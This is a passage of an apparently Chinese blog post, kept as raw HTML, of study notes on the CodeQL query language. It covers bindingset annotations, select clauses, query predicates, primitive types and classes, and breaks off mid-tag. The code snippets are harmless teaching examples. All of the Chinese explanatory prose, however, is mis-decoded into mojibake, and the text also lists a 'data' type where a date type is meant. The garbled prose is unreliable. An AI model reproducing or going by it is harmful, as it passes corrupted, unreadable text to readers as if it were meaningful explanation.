class="keyword">and</span> plusOne(<span class="number">1</span>, z)</span><br><span class="line"><span class="keyword">select</span> z</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317113123536.png" alt="image-20250317113123536"></p><p>è¿™ä¸ªç»‘å®šé›†çš„æ„æ€æ˜¯å¦‚æœxæˆ–yç»‘å®š(bound)äº†ï¼Œé‚£ä¹ˆxå’Œyéƒ½ç»‘å®šï¼Œå³è‡³å°‘æœ‰ä¸€ä¸ªå‚æ•°å—åˆ°çº¦æŸã€‚<br>å¦‚æœæˆ‘ä»¬æƒ³è¦ä¸¤è€…éƒ½å—çº¦æŸï¼Œå¯ä»¥å°†ä¾‹å­ä¿®æ”¹ä¸€ä¸‹:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x, y]</span><br><span class="line">predicate plusOne(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">+</span> <span class="number">1</span> <span class="operator">=</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªè°“è¯å°±å˜ä¸ºäº†ä¸€ä¸ªç±»ä¼¼äºæ ¡éªŒçš„å‡½æ•°ï¼Œå³<code>x+1 == y</code>ã€‚</p><h3 id="æŸ¥è¯¢Queries">æŸ¥è¯¢Queries</h3><p>å®˜æ–¹æ–‡æ¡£<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>ï¼ŒæŸ¥è¯¢æ˜¯<code>CodeQL</code>çš„è¾“å‡ºã€‚æŸ¥è¯¢çš„ä¸¤ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯</p><ul><li><code>select</code>å­å¥</li><li>æŸ¥è¯¢è°“è¯­ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»å½“å‰æ¨¡å—ä¸­å®šä¹‰æˆ–è€…ä»å…¶ä»–æ¨¡å—ä¸­å¯¼å…¥ã€‚</li></ul><h4 id="selectå­å¥">selectå­å¥</h4><p>å­å¥çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="comment">/* ... variable declarations ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... logical formula ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure><p><code>from</code>å’Œ<code>where</code>éƒ¨åˆ†æ˜¯å¯é€‰çš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨<code>from</code>ä¸­å®šä¹‰å˜é‡ï¼Œåœ¨<code>where</code>ä¸­ç»™å˜é‡èµ‹å€¼å’Œå¯¹æŸ¥è¯¢ç»“æœçš„è¿‡æ»¤ï¼Œæœ€ååœ¨<code>select</code>ä¸­æ˜¾ç¤ºç»“æœã€‚</p><p>åœ¨<code>select</code>åé¢é™¤äº†è¡¨è¾¾å¼(<code>expressions</code>)ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›å…³é”®å­—ï¼š</p><ul><li><code>as</code>å…³é”®å­—ï¼Œåé¢è·Ÿéšä¸€ä¸ªåå­—ã€‚ä½œç”¨ç›¸å½“äºsqlä¸­çš„<code>as</code>ï¼Œä¸ºç»“æœåˆ—æä¾›äº†ä¸€ä¸ª&quot;æ ‡ç­¾&quot;ï¼Œå¹¶å…è®¸åœ¨åç»­çš„<code>select</code>è¡¨è¾¾å¼ä¸­ä½¿ç”¨å®ƒä»¬ã€‚</li><li><code>order by</code>å…³é”®å­—ï¼Œåé¢è·Ÿéšä¸€ä¸ªç»“æœåˆ—åã€‚ä½œç”¨ç›¸å½“äºsqlä¸­çš„<code>order by</code>ï¼Œç”¨äºæ’åºç»“æœï¼Œå¹¶ä¸”åœ¨ç»“æœåˆ—ååå¯é€‰<code>asc</code>(å‡åº)æˆ–<code>desc</code>(é™åº)å…³é”®å­—ã€‚</li></ul><p><code>as</code>å…³é”®å­—ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428223626775.png" alt="image-20250428223626775"></p><p><code>order by</code>å…³é”®å­—ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product <span class="keyword">order</span> <span class="keyword">by</span> y <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428224020685.png" alt="image-20250428224020685"></p><h4 id="æŸ¥è¯¢è°“è¯">æŸ¥è¯¢è°“è¯</h4><p>æŸ¥è¯¢è°“è¯æ˜¯ä¸€ä¸ª<strong>éæˆå‘˜è°“è¯</strong>ï¼Œå¹¶åœ¨æœ€å¼€å¤´ä½¿ç”¨<code>query</code>ä½œä¸ºæ³¨è§£ã€‚å®ƒè¿”å›è°“è¯è®¡ç®—ç»“æœçš„æ‰€æœ‰å…ƒç»„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹:</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query <span class="type">int</span> getProduct(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span></span><br><span class="line">  y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>] <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> x <span class="operator">*</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428233723056.png" alt="image-20250428233723056"></p><p>ç¼–å†™æŸ¥è¯¢è°“è¯è€Œä¸æ˜¯<code>select</code>å­å¥çš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨ä»£ç çš„å…¶å®ƒéƒ¨åˆ†è°ƒç”¨è°“è¯ã€‚<code>select</code>å­å¥å°±åƒä¸€ä¸ªåŒ¿åè°“è¯ï¼Œä½ ä»¥åæ— æ³•è°ƒç”¨å®ƒã€‚</p><p>ä¾‹å¦‚ï¼Œ æˆ‘ä»¬å¯ä»¥åœ¨ç±»ä¸­çš„ç‰¹å¾è°“è¯å†…éƒ¨è°ƒç”¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">query <span class="type">int</span> getProduct(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">    x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span></span><br><span class="line">    y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>] <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> x <span class="operator">*</span> y</span><br><span class="line">&#125;</span><br><span class="line">class MultipleOfThree extends <span class="type">int</span> &#123;</span><br><span class="line">    MultipleOfThree() &#123; </span><br><span class="line">        this <span class="operator">=</span> getProduct(_, _) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> MultipleOfThree m <span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬æŸ¥è¯¢ç»“æœå°±æœ‰2ä¸ªï¼Œä¸€ä¸ªæ˜¯å†…ç½®çš„<code>#select</code>ï¼Œä¸€ä¸ªæ˜¯<code>getProduct</code>ï¼Œ<code>#select</code>çš„ç»“æœå¦‚ä¸‹:</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428234414817.png" alt="image-20250428234414817"></p><h3 id="ç±»å‹Types">ç±»å‹Types</h3><p><code>QL</code>æ˜¯ä¸€ç§é™æ€ç±»å‹è¯­è¨€ï¼Œå› æ­¤æ¯ä¸ªå˜é‡éƒ½å¿…é¡»å…·æœ‰å£°æ˜ç±»å‹ã€‚</p><p>ç±»å‹æ˜¯ä¸€ç»„å€¼ã€‚ä¾‹å¦‚ï¼Œç±»å‹<code>int</code>æ˜¯æ•´æ•°çš„é›†åˆã€‚æ³¨æ„âš ï¸ï¼Œä¸€ä¸ªå€¼å¯ä»¥å±äºå¤šä¸ªé›†åˆï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥æœ‰å¤šç§ç±»å‹ã€‚</p><p><code>QL</code>ä¸­çš„ç±»å‹æœ‰åŸå§‹ç±»å‹(<code>primitive types</code>)ã€ç±»(<code>classes</code>)ã€å­—ç¬¦ç±»å‹(<code>character types</code>)ã€ç±»åŸŸç±»å‹(<code>class domain types</code>)ã€ä»£æ•°æ•°æ®ç±»å‹(<code>algebraic datatypes</code>)ã€ç±»å‹è”åˆ(<code>type unions</code>)å’Œæ•°æ®åº“ç±»å‹(<code>database types</code>)ã€‚</p><h4 id="åŸå§‹ç±»å‹-Primitive-types">åŸå§‹ç±»å‹(Primitive types)</h4><p>è¿™äº›ç±»å‹å†…ç½®äº QL ä¸­ï¼Œå¹¶ä¸”å§‹ç»ˆåœ¨å…¨å±€<a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces">å‘½åç©ºé—´</a>ä¸­å¯ç”¨ï¼Œç‹¬ç«‹äºæ‚¨æ­£åœ¨æŸ¥è¯¢çš„æ•°æ®åº“ã€‚</p><ol><li><strong>boolean</strong> : æ­¤ç±»å‹åŒ…å«å€¼<code>true</code>å’Œ<code>false</code>ã€‚</li><li><strong>float</strong> : æ­¤ç±»å‹åŒ…å«64ä½æµ®ç‚¹æ•°ï¼Œä¾‹å¦‚<code>6.28</code>å’Œ<code>-0.618</code></li><li><strong>int</strong> : æ­¤ç±»å‹åŒ…å« 32 ä½<a href="https://en.wikipedia.org/wiki/Two's_complement">äºŒè¿›åˆ¶è¡¥ç </a>æ•´æ•°ï¼Œä¾‹å¦‚<code>-1</code>å’Œ<code>42</code> ã€‚</li><li><strong>string</strong> : æ­¤ç±»å‹åŒ…å« 16 ä½å­—ç¬¦çš„æœ‰é™å­—ç¬¦ä¸²ã€‚</li><li><strong>data</strong> : æ­¤ç±»å‹åŒ…å«æ—¥æœŸï¼ˆä¹Ÿå¯ä»¥åŒ…å«æ—¶é—´ï¼‰ã€‚</li></ol><p>QL åœ¨åŸºæœ¬ç±»å‹ä¸Šå®šä¹‰äº†ä¸€ç³»åˆ—å†…ç½®æ“ä½œã€‚è¿™äº›æ“ä½œå¯ä»¥é€šè¿‡ä½¿ç”¨<code> .</code>çš„æ–¹å¼è¿›è¡Œè°ƒç”¨ã€‚ä¾‹å¦‚ï¼Œ <code>1.toString()</code>æ˜¯æ•´æ•°å¸¸é‡<code>1</code>çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚æœ‰å…³ QL ä¸­å¯ç”¨çš„å†…ç½®æ“ä½œçš„å®Œæ•´åˆ—è¡¨ï¼Œè¯·å‚é˜… QL è¯­è¨€è§„èŒƒä¸­çš„<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins">å†…ç½®æ“ä½œ</a>éƒ¨åˆ†ã€‚</p><p>æ­¤å¤–ï¼Œ <a href="https://codeql.github.com/docs/ql-language-reference/modules/#bigint">QlBuiltins::BigInt</a>æœ‰ä¸€ä¸ªä»»æ„èŒƒå›´çš„æ•´æ•°åŸå§‹ç±»å‹</p><h4 id="ç±»-Classes">ç±»(Classes)</h4><p>ä½ å¯ä»¥åœ¨<code>QL</code>ä¸­å®šä¹‰è‡ªå·±çš„ç±»å‹ã€‚ä¸€ç§æ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ª<strong>ç±»</strong>ã€‚</p><p>ç±»æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥é‡å†™å’Œæ„é€ ä»£ç ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ï¼š</p><ul><li>å°†ç›¸å…³å€¼ç»„åˆåœ¨ä¸€èµ·ã€‚</li><li>æ ¹æ®è¿™äº›å€¼å®šä¹‰<a href="https://codeql.github.com/docs/ql-language-reference/types/#member-predicates">æˆå‘˜è°“è¯</a>ã€‚</li><li>å®šä¹‰å­ç±»ä»¥é‡å†™æˆå‘˜è°“è¯ã€‚</li></ul><p>QL ä¸­çš„ç±»ä¸ä¼šâ€œåˆ›å»ºâ€æ–°å¯¹è±¡ï¼Œå®ƒä»…è¡¨ç¤ºé€»è¾‘å±æ€§ã€‚å¦‚æœæŸä¸ªå€¼æ»¡è¶³è¯¥é€»è¾‘å±æ€§ï¼Œåˆ™è¯¥å€¼å±äºç‰¹å®šç±»ã€‚</p><h5 id="å®šä¹‰ä¸€ä¸ªç±»å‹-Defining-a-class">å®šä¹‰ä¸€ä¸ªç±»å‹(Defining a class)</h5><p>è¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œä½ å¯ä»¥è¿™æ ·å†™ï¼š</p><ol><li>å…³é”®å­—<code>class</code></li><li>ç±»çš„åç§°ã€‚è¿™æ˜¯ä¸€ä¸ª<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers">æ ‡è¯†ç¬¦</a> ä»¥å¤§å†™å­—æ¯å¼€å¤´ã€‚</li><li>æ”¹ç±»é€šè¿‡<code>extends</code>å’Œ<code>/</code>æˆ–<code>instanceof</code>å…³è”çˆ¶ç±»å‹(<code>supertypes</code>)ã€‚</li><li>ç±»çš„ä¸»ä½“ï¼Œç”¨æ‹¬å·æ‹¬èµ·æ¥ã€‚</li></ol><p>å®šä¹‰ç±»çš„æ ¼å¼ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span> [<span class="keyword">extends</span> <span class="title class_">Parent</span>] &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»åé¦–å­—æ¯å¿…é¡»æ˜¯å¤§å†™âš ï¸ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å®šä¹‰äº†ä¸€ä¸ªç±»<code>OneTwoThree</code>ï¼Œå®ƒåŒ…å«å€¼<code>1</code>,<code>2</code>å’Œ<code>3</code>ã€‚ <a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">ç‰¹å¾è°“è¯</a>æ•æ‰ â€œæ˜¯æ•´æ•° 1ã€2 æˆ– 3 ä¹‹ä¸€â€ çš„é€»è¾‘å±æ€§ã€‚</p><p><code>OneTwoThree</code>æ‰©å±•äº†<code>int</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæ˜¯<code>int</code>çš„å­ç±»å‹ã€‚<code>QL</code>ä¸­çš„ç±»å¿…é¡»å§‹ç»ˆå…·æœ‰è‡³å°‘ä¸€ä¸ªçˆ¶ç±»å‹(<code>supertypes</code>)ã€‚ä½¿ç”¨<code>extends</code>å…³é”®å­—å¼•ç”¨çš„çˆ¶ç±»å‹ç§°ä¸ºç±»çš„åŸºç±»å‹(<code>base types</code>)ã€‚ç±»çš„å€¼åŒ…å«åœ¨çˆ¶ç±»å‹çš„äº¤é›†ä¸­ï¼ˆå³ï¼Œå®ƒä»¬ä½äº<a href="https://codeql.github.com/docs/ql-language-reference/types/#domain-types">ç±»çš„åŸŸç±»å‹</a>ä¸­ï¼‰ã€‚ç±»ä»å…¶åŸºç±»å‹ç»§æ‰¿æ‰€æœ‰æˆå‘˜è°“è¯ã€‚</p><p>ä¸€ä¸ªç±»å¯ä»¥æ‰©å±•å¤šç§ç±»å‹ã€‚æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#multiple-inheritance"> å¤šé‡ç»§æ‰¿ </a>&quot;ã€‚ä¸€ä¸ªç±»å¯ä»¥æ‰©å±•<code>final</code>ç±»å‹ï¼ˆæˆ–<code>final</code>ç±»å‹çš„åˆ«åï¼‰ï¼Œè¯·å‚é˜…&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#final-extensions">final æ‰©å±• </a>â€œã€‚ç±»è¿˜å¯ä»¥ç‰¹åŒ–å…¶ä»–ç±»å‹ï¼Œè€Œæ— éœ€é€šè¿‡<code>instanceof</code>æ‰©å±•ç±»æ¥å£ï¼Œè¯·å‚é˜…â€<a href="https://codeql.github.com/docs/ql-language-reference/types/#instanceof-extensions"> ä¸æ‰©å±•å­ç±»å‹ </a>&quot;ã€‚</p><p>åœ¨<code>CodeQL</code>ä¸­ï¼Œç±»å…è®¸å¤šé‡ç»§æ‰¿ï¼Œä½†æ˜¯ä»¥ä¸‹æ“ä½œæ˜¯éæ³•çš„:</p><ul><li>ä¸èƒ½ç»§æ‰¿æœ¬èº«</li><li>ä¸èƒ½ç»§æ‰¿<code>final</code>ç±»</li><li>ä¸èƒ½ç»§æ‰¿ä¸å…¼å®¹çš„ç±»å‹ï¼Œè¯·å‚è€ƒ&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility"> ç±»å‹å…¼å®¹æ€§ </a>&quot;ã€‚</li></ul><p>ä½ ä¹Ÿå¯ä»¥ä¸ºç±»æ·»åŠ æ³¨è§£ã€‚å¯ä»¥æŸ¥çœ‹ç±»çš„<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#annotations-overview">æ³¨è§£</a>åˆ—è¡¨ã€‚</p><h5 id="ç±»ä¸»ä½“-Class-bodies">ç±»ä¸»ä½“(Class bodies)</h5><p>ç±»çš„ä¸»ä½“å¯ä»¥åŒ…å«ï¼š</p><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">ç‰¹å¾è°“è¯</a>(<code>characteristic predicate</code>)å£°æ˜ã€‚</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">ç‰¹å¾è°“è¯</a>(<code>member predicate</code>)å£°æ˜ã€‚</li><li>ä»»æ„æ•°é‡çš„<a href="https://codeql.github.com/docs/ql-language-reference/types/#fields">å­—æ®µ</a>(<code>field</code>)å£°æ˜ã€‚</li></ul><p>å½“ä½ å®šä¹‰ä¸€ä¸ªç±»æ—¶ï¼Œè¯¥ç±»è¿˜ä¼šä»å…¶çˆ¶ç±»å‹ç»§æ‰¿æ‰€æœ‰éç§æœ‰æˆå‘˜è°“è¯å’Œå­—æ®µã€‚</p><p>æ ¹æ®å®ƒä»¬æ˜¯å¦æ˜¯<code>final</code>çš„ï¼Œä½ å¯ä»¥<a href="https://codeql.github.com/docs/ql-language-reference/types/#overriding-member-predicates">é‡å†™</a>(<code>override</code>)æˆ– <a href="https://codeql.github.com/docs/ql-language-reference/types/#final-extensions">éšè—</a>(<code>shadow</code>)è¿™äº›è°“è¯å’Œå­—æ®µä»¥èµ‹äºˆå®ƒä»¬æ›´å…·ä½“çš„å®šä¹‰ã€‚</p><h5 id="ç‰¹å¾è°“è¯-Characteristic-predicate">ç‰¹å¾è°“è¯(Characteristic predicate)</h5><p>ç±»ä¼¼äºå…¶ä»–è¯­è¨€ä¸­ç±»çš„æ„é€ å‡½æ•°ï¼Œåªèƒ½å®šä¹‰ä¸€ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç‰¹å¾è°“è¯ä¸­ä½¿ç”¨<code>this</code>æ¥é™åˆ¶ç±»ä¸­å¯èƒ½çš„å€¼ã€‚åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œ<code>OneTwoThree</code>è¢«é™åˆ¶ä¸º<code>1-3</code>ä¸­çš„æ•´æ•°ã€‚</p><h5 id="æˆå‘˜è°“è¯-Member-predicate">æˆå‘˜è°“è¯(Member predicate)</h5><p>è¿™äº›è°“è¯ä»…é€‚ç”¨äºç±»ä¸­ã€‚æˆ‘ä»¬å¯ä»¥è¿™æ ·å»è°ƒç”¨ç±»çš„æˆå‘˜è°“è¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends <span class="type">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="operator">/</span><span class="operator">/</span> characteristic predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string getAString() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      <span class="keyword">result</span> <span class="operator">=</span> &quot;One, two or three: &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate isEven() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1.</span>(OneTwoThree).getAString()</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250429143457327.png" alt="image-20250429143457327"></p><p>è¡¨è¾¾å¼ï¼ˆ<code>OneTwoThree</code>)æ˜¯ä¸€ä¸ª<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#casts">å¼ºåˆ¶ç±»å‹è½¬æ¢ </a>ã€‚å®ƒç¡®ä¿<code>1</code>å…·æœ‰ç±»å‹<code>OneTwoThree</code>è€Œä¸ä»…ä»…æ˜¯<code>int</code>ã€‚å› æ­¤ï¼Œå®ƒå¯ä»¥è®¿é—®æˆå‘˜è°“è¯<code>getAString()</code>ã€‚</p><p>è¿˜å¯ä»¥è¿™æ ·è°ƒç”¨ï¼Œä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>string</code>å®šä¹‰çš„å†…ç½®å‡½æ•°<code>toUpperCase()</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1.</span>(OneTwoThree).getAString().toUpperCase()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250429152458427.png" alt="image-20250429152458427"></p><h5 id="å­—æ®µ-Field">å­—æ®µ(Field)</h5><p>è¿™äº›æ˜¯åœ¨ç±»ä¸»ä½“ä¸­å£°æ˜çš„å˜é‡ã€‚ç±»ä¸»ä½“ä¸­å¯ä»¥æœ‰ä»»æ„æ•°é‡çš„å­—æ®µå£°æ˜ã€‚ä½ å¯ä»¥åœ¨ç±»å†…éƒ¨çš„è°“è¯å£°æ˜ä¸­ä½¿ç”¨è¿™äº›å˜é‡ã€‚ä¸<a href="https://codeql.github.com/docs/ql-language-reference/types/#this">å˜é‡ </a><code>this</code> ç±»ä¼¼ï¼Œå­—æ®µå¿…é¡»åœ¨<a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">ç‰¹å¾è°“è¯</a> ä¸­å—åˆ°çº¦æŸã€‚</p><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼Œå®ƒè¾“å‡º<code>10</code>ä»¥å†…æ¯ä¸ªæ•°å­—çš„é™¤æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class <span class="type">SmallInt</span> extends <span class="type">int</span> &#123;</span><br><span class="line">    <span class="type">SmallInt</span>() &#123; this <span class="operator">=</span> [<span class="number">1</span> .. <span class="number">10</span>] &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  class DivisibleInt extends <span class="type">SmallInt</span> &#123;</span><br><span class="line">    <span class="type">SmallInt</span> divisor;   <span class="operator">/</span><span class="operator">/</span> declaration <span class="keyword">of</span> the field `divisor`</span><br><span class="line">    DivisibleInt() &#123; this <span class="operator">%</span> divisor <span class="operator">=</span> <span class="number">0</span> &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="type">SmallInt</span> getADivisor() &#123; <span class="keyword">result</span> <span class="operator">=</span> divisor &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">from</span> DivisibleInt i</span><br><span class="line">  <span class="keyword">select</span> i, i.getADivisor()</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430115409761.png" alt="image-20250430115409761"></p><h5 id="å…·ä½“ç±»-Concrete-classes">å…·ä½“ç±»(Concrete classes)</h5><p>ä¸Šè¿°æ‰€æåˆ°çš„ç±»éƒ½æ˜¯å…·ä½“çš„ç±»ï¼Œå…·ä½“ç±»æ˜¯é€šè¿‡é™åˆ¶è¾ƒå¤§ç±»å‹ä¸­çš„å€¼æ¥å®šä¹‰çš„ã€‚</p><h5 id="æŠ½è±¡ç±»-Abstract-classes">æŠ½è±¡ç±»(Abstract classes)</h5><p>å¸¦æœ‰ <code>abstract</code><a 